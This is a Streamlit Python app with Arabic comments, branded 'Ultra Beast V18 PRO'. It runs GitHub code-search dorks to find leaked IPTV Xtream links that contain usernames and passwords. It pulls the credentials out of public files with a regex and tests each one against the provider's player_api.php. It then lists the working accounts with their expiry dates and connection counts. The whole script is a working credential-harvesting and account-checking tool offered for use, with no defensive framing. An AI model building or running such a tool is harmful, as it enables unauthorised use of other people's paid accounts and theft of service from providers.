import streamlit as st
import requests
import re
import time
from datetime import datetime

# =================================================
# 1. إعدادات الأمان والتنسيق
# =================================================
if "password_correct" not in st.session_state:
    st.session_state.password_correct = False

def login():
    st.markdown("<h1 style='text-align: center; color:#00E676;'>🌪️ ULTRA BEAST V18 PRO</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V18":
            st.session_state.password_correct = True
            st.rerun()
        else: st.error("❌ خطأ!")

if not st.session_state.password_correct:
    login()
    st.stop()

st.set_page_config(page_title="Ultra Beast V18 PRO", layout="wide")

st.markdown("""
<style>
    .stApp { background-color: #0e1117; }
    .card { background: #1a1c23; border-radius: 10px; padding: 15px; border-left: 5px solid #00E676; margin-bottom: 10px; }
    .stat-box { background: #262730; padding: 10px; border-radius: 5px; text-align: center; }
    .log-text { color: #fbbf24; font-family: monospace; font-size: 13px; }
</style>
""", unsafe_allow_html=True)

# =================================================
# 2. محرك الفحص المتطور
# =================================================
if 'results' not in st.session_state: st.session_state.results = []
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'stats' not in st.session_state: st.session_state.stats = {"checked": 0, "found": 0}

def check_account(host, user, pw):
    try:
        # فحص كلاسيكي سريع (Timeout قصير لعدم تعطيل البحث)
        api_url = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(api_url, timeout=4).json()
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            return {
                "host": host, "user": user, "pass": pw, "exp": exp,
                "conn": f"{info.get('active_cons', '0')}/{info.get('max_connections', '1')}"
            }
    except: return None
    return None

# =================================================
# 3. الواجهة الجانبية والتحكم
# =================================================
with st.sidebar:
    st.image("https://cdn-icons-png.flaticon.com/512/924/924514.png", width=100)
    st.title("BEAST V18")
    token = st.text_input("GitHub Token:", type="password")
    
    if st.button("🚀 ابدأ الهجوم المليوني"):
        if token:
            st.session_state.is_hunting = True
            st.session_state.results = []
            st.session_state.stats = {"checked": 0, "found": 0}
            st.rerun()
        else: st.warning("أدخل التوكن أولاً")
        
    if st.button("🛑 إيقاف"):
        st.session_state.is_hunting = False
        st.rerun()

    st.divider()
    st.metric("💎 النتائج الشغالة", st.session_state.stats["found"])
    st.metric("🔍 عدد الفحوصات", st.session_state.stats["checked"])

# =================================================
# 4. الرادار المباشر (قلب النظام)
# =================================================
st.subheader("📡 رادار الصيد والتحليل المباشر")
status_msg = st.empty()
log_area = st.empty()

# عرض النتائج
for res in st.session_state.results:
    with st.container():
        st.markdown(f"""
        <div class="card">
            <b style="color:#00E676;">✅ ACTIVE | {res['exp']}</b><br>
            <code>{res['host']}</code><br>
            👤 {res['user']} | 🔑 {res['pass']} | 🔌 {res['conn']}
        </div>
        """, unsafe_allow_html=True)

# تشغيل عملية البحث
if st.session_state.is_hunting:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    
    # دورتات "هجومية" لضمان جلب نتائج
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'iptv xtream 2026',
        '"http" "username" "password" "port" extension:txt',
        'filename:iptv_list.txt',
        'filename:accounts.txt "http"'
    ]

    while st.session_state.is_hunting:
        for dork in dorks:
            if not st.session_state.is_hunting: break
            
            for page in range(1, 15):
                if not st.session_state.is_hunting: break
                status_msg.info(f"🔎 جاري فحص الدورك: {dork} | صفحة: {page}")
                
                try:
                    search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                    res = requests.get(search_url, headers=headers).json()
                    
                    if "items" not in res:
                        log_area.error(f"⚠️ تنبيه: جيت هاب توقف عن إعطاء نتائج. (السبب: {res.get('message', 'Rate Limit')})")
                        time.sleep(30) # انتظار لفك الحظر
                        continue

                    for item in res['items']:
                        if not st.session_state.is_hunting: break
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        
                        try:
                            content = requests.get(raw_url, timeout=3).text
                            # Regex مطور يدعم HTTPS والروابط المختلفة
                            # يبحث عن: http(s)://host:port/...username=...&password=...
                            pattern = r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)"
                            matches = re.findall(pattern, content)
                            
                            for m in matches:
                                host, user, pw = m[0], m[1], m[2]
                                st.session_state.stats["checked"] += 1
                                
                                log_area.markdown(f"<p class='log-text'>⚡ فحص: {host}...</p>", unsafe_allow_html=True)
                                
                                found = check_account(host, user, pw)
                                if found:
                                    st.session_state.results.insert(0, found)
                                    st.session_state.stats["found"] += 1
                                    st.rerun()
                        except: continue
                except: continue
                time.sleep(2) # حماية من الحظر
